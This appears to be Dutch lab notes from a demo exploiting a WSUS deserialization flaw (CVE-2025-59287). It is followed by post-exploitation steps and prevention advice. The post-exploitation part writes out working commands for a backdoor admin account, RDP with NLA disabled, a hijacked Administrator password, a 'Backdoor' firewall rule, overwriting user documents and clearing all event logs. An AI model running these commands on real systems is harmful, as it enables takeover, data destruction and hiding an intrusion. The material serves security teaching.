# Demo inzichten

## Anatomie van de aanval

De kern van het probleem is dat de WSUS-endpoint (de luisterende server) erop vertrouwt dat de data die hij ontvangt "veilig" is,<br>
terwijl de aanvaller de structuur van die data manipuleert om eigen opdrachten uit te voeren.

### 1. De Ingang: SOAP & API Endpoints

WSUS communiceert standaard via XML-gebaseerde protocollen (SOAP). Wanneer de Kali-machine verbinding maakt met poort 8530 (HTTP) of 8531 (HTTPS),<br>
richt hij zich op specifieke webservices die bedoeld zijn voor client-communicatie of synchronisatie.<br>
De kwetsbaarheid ontstaat wanneer een van deze endpoints een geserialiseerd object verwacht om de status van een update of een client-configuratie te verwerken.

### 2. Het Mechanisme: Wat is "Pickle" Deserialisatie?

In Python wordt de pickle module gebruikt om objecten om te zetten in een bytestream (serialisatie) en weer terug (deserialisatie).

Het probleemzit in de `__reduce__` methode in Python's Pickle.

**De exploit:** Wanneer de WSUS-service de geprepareerde data "unpickled", voert hij de instructies uit die in de `__reduce__` functie staan gedefinieerd.<br>
In plaats van een legitiem object te reconstrueren, dwing je de server om een systeemcommando uit te voeren via bijvoorbeeld `os.system()` of `subprocess.Popen()`.

### 3. De Payload Delivery

Het Python-script stuurt een POST-request naar de WSUS-service. Dit request bevat de kwaadaardige bytestream verpakt in de body van het HTTP-bericht.<br>
Omdat de WSUS-service denkt dat dit een legitieme interactie is van een "Downstream Server" of een "Client Computer",<br>
pakt hij de data uit om deze te verwerken.

### 4. Privilege Escalation (Impact)

Dit is waar het kritiek wordt. Omdat de WSUS-service (dikwijls draaiend onder `NT AUTHORITY\NETWORK SERVICE` of zelfs `SYSTEM`) de data verwerkt,<br>
wordt de code uitgevoerd met dezelfde rechten als de service.

**Scenario:** Als je een reverse shell injecteert, krijgt de Kali-machine een verbinding terug waarbij je direct volledige controle hebt over de Windows Server,<br> zonder dat je een wachtwoord nodig hebt.

---

| **Fase**       | **Actie van de Aanvaller (Kali)**                            | **Reactie van de Target (WSUS)**                            |
| -------------- | ------------------------------------------------------------ | ----------------------------------------------------------- |
| **Trigger**    | Verzendt gemanipuleerde `pickle` payload via HTTP POST       | Ontvangt de data op poort 8530                              |
| **Processing** | Wacht op de uitvoering van de `__reduce__` instructie        | Start het deserialisatieproces van het object               |
| **Execution**  | Luistert (bijv. via `nc -lvnp`) naar een binnenkomende shell | Voert de kwaadaardige code uit (bijv. `whoami > proof.txt`) |
| **Access**     | Bevestigt RCE (Remote Code Execution)                        | "De service blijft draaien, maar is nu gecompromitteerd"    |

### 5. Waarom dit werkt op Windows Server 2022?

Hoewel Windows Server 2022 modern is, leunt WSUS op legacy-architecturen en API's die soms nog steeds objecten op een onveilige manier deserialiseren.<br>
CVE-2025-59287 maakt misbruik van het feit dat de validatie van de binnenkomende objecten niet strikt genoeg is voordat ze in het geheugen worden geladen.

In een echte scenario-test is het cruciaal om te controleren of de Windows Defender-instellingen of EDR (Endpoint Detection & Response) de uitvoering van<br> ongebruikelijke subprocessen door de `wsusservice.exe` blokkeren.

## 1. Post-Exploitation

### 1.1 Persistentie: Een eigen gebruiker aanmaken

#### 1.1.1 Inzicht

Hiermee creëeren we een "legitieme" ingang.<br>
Zelfs als het kwetsbare Python-script wordt verwijderd, kunnen we nu via RDP (Remote Desktop) inloggen als administrator.

#### 1.1.2 RDP activeren via de Shell

**1.** Nieuwe user en paswoord aanmaken

```powershell
net user Pawny HappyHacking! /add
net localgroup Administrators Pawny /add
```

**2.** RDP inschakelen in het register

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
```

**3.** RDP toestaan door de Windows Firewall

```powershell
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

**4.** Beveiliging verlagen zodat Kali makkelijker kan verbinden (NLA uitschakelen)

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
```

### 1.2 Sabotage: Wachtwoord van de Administrator wijzigen

#### 1.2.1 Inzicht

De echte systeembeheerder kan niet meer inloggen op zijn eigen server.<br>
De organisatie is de controle over hun eigen infrastructuur volledig kwijt.

#### 1.2.2 Commando

```powershell
net user Administrator YouGotPawned!
```

### 1.3 Verdediging uitschakelen: Firewall manipulatie

#### 1.3.1 Inzicht

We kunnen de de firewall niet alleen uitzetten , maar juist tegen de beheerder gebruiken door poorten te sluiten<br>
of juist open te zetten voor onze tools.

#### 1.3.2 Commando

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
# Maar open specifiek een poort voor onze malware:
New-NetFirewallRule -DisplayName "Backdoor" -Direction Inbound -Protocol TCP -LocalPort 443 -Action Allow
```

### 1.4 Ransomware-simulatie (Bestandssysteem vernietigen)

#### 1.4.1 Inzicht

In plaats van bestanden te stelen, kunnen we ze onbruikbaar maken.<br>
Een aanvaller kan alle documenten op de server versleutelen of simpelweg overschrijven.<br>
Dit simuleert de impact van ransomware. Het laat zien dat data-integriteit binnen seconden verloren kan gaan.

#### 1.4.2 Commando (overschrijven van alle .docx bestanden):

```powershell
Get-ChildItem -Path C:\Users -Include *.docx,*.pdf -Recurse | ForEach-Object { "GEHACKT" | Out-File $_.FullName }
```

### 1.5 Sporen uitwissen (Anti-Forensics)

#### 1.5.1 Inzicht

Een slimme aanvaller zorgt dat de IT-afdeling achteraf niet kan zien wat er is gebeurd. Dit maakt recuperatie en onderzoek bijna onmogelijk.<br>
De beheerder weet dat er iets mis is, maar kan niet achterhalen hoe of wanneer het gebeurde.<br>
Dit is mogelijks de laatste stap van een hacker voordat hij uitlogt.

#### 1.5.2 Commando (leegmaken van alle Windows Event Logs):

```powershell
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }
```

## Mogelijke schade & recuperatie

- **Schade:** De schade is niet alleen technisch (dataverlies), maar ook operationeel.<br>
  Als dit een WSUS-server is (zoals in ons labo), kan de aanvaller valse updates pushen naar alle computers in de organisatie.<br>
  Dit maakt het een "Supply Chain Attack" binnen het eigen netwerk.

- **Recuperatie:** Hoe makkelijk herstelt een team? Zeer moeilijk. Omdat de aanvaller administrator-rechten had,<br>
  kan er overal in het systeem een backdoor zitten (in het register, in geplande taken, in de kernel, ...).<br>
  De enige veilige manier om te recupereren is de server volledig wissen en herinstalleren vanaf een vertrouwde back-up van vóór de inbraak.

- **Impact:** Een aanvaller die RDP-toegang heeft, kan programma's gebruiken die via een terminal lastig zijn (zoals browsers om malware te downloaden, of grafische beheerprogramma's van databases).

- **Persistentie:** Zelfs als de IT-beheerder de kwetsbare Python-server vindt en stopt, blijft ons "backdoor" account bestaan en de RDP-poort open.<br>
  We hebben onze toegang "gelegaliseerd".

- **Business Continuity:** Als je de Administrator het wachtwoord ontneemt (zoals we eerder deden) en logs wist,<br>
  moet de organisatie mogelijk dagenlang fysiek de stekker uit de servers trekken om de aanval te stoppen.<br>
  De loonkosten van medewerkers die niet kunnen werken zijn vaak vele malen hoger dan de technische herstelkosten.

- **De rol van EDR (Endpoint Detection and Response):** Merk op dat moderne systemen zoals CrowdStrike of Microsoft Defender for Endpoint<br>
  dit soort PowerShell-gedrag (zoals Clear-EventLog) onmiddellijk zouden vlaggen. Het feit dat onze aanval slaagt,<br>
  suggereert dat de "Security Monitoring" van de organisatie gefaald heeft.

## Impact minimaliseren & preventie

- **Least Privilege Principle:** Waarom draait die Python/WSUS-service als Administrator?<br>
  Als de service draait onder een "Service Account" met beperkte rechten, had de aanval nooit de firewall kunnen aanpassen of nieuwe gebruikers kunnen aanmaken.

- **Network Segmentation:** De server zou niet direct met het internet moeten kunnen praten.<br>
  Een "Egress Firewall Rule" die verbindingen naar buiten (zoals onze reverse shell naar Kali) blokkeert, had de aanval gestopt, zelfs als de exploit slaagde.

- **Safe Deserialization:** In plaats van pickle (dat inherent onveilig is), moeten ontwikkelaars veilige formaten zoals JSON gebruiken.<br>
  JSON is pure data en bevat geen uitvoerbare code-instructies.

- **RDP beperken:** RDP mag nooit direct vanaf een ander netwerk bereikbaar zijn. Gebruik een "Jump Server" of VPN.

- **RDP Logging:** Een alert instellen zodra er een nieuwe RDP-sessie wordt gestart, zeker van een account dat net is aangemaakt.

- **MFA (Multi-Factor Authentication):** Zelfs als de aanvaller een account aanmaakt,<br>
  zou hij zonder de mobiele telefoon van de beheerder niet kunnen inloggen via RDP.
